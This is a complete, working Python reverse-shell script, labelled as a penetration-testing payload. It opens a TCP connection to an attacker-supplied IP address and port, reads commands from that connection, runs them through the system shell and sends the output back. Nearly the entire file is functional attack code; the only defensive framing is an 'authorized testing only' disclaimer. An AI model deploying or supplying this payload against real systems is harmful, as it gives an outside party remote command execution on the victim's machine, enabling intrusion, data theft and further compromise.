#!/usr/bin/env python3
"""
Reverse Shell Payload
Simple reverse shell for penetration testing
WARNING: For authorized testing only!
"""

import socket
import subprocess
import os
import argparse

def reverse_shell(host, port):
    """Connect back to attacker and provide shell access"""
    try:
        print(f"[*] Connecting to {host}:{port}...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print("[+] Connection established!")

        while True:
            # Receive command
            command = s.recv(1024).decode('utf-8').strip()

            if not command or command.lower() == 'exit':
                break

            # Execute command
            try:
                if command.startswith('cd '):
                    path = command[3:].strip()
                    os.chdir(path)
                    output = f"Changed directory to: {os.getcwd()}\n"
                else:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    output = result.stdout + result.stderr

                if not output:
                    output = "[*] Command executed (no output)\n"

            except subprocess.TimeoutExpired:
                output = "[!] Command timeout\n"
            except Exception as e:
                output = f"[!] Error: {str(e)}\n"

            # Send output back
            s.send(output.encode('utf-8'))

    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        s.close()
        print("[*] Connection closed")

def main():
    parser = argparse.ArgumentParser(description='Reverse Shell Payload')
    parser.add_argument('-H', '--host', required=True, help='Attacker IP address')
    parser.add_argument('-p', '--port', type=int, required=True, help='Attacker port')

    args = parser.parse_args()

    reverse_shell(args.host, args.port)

if __name__ == "__main__":
    main()
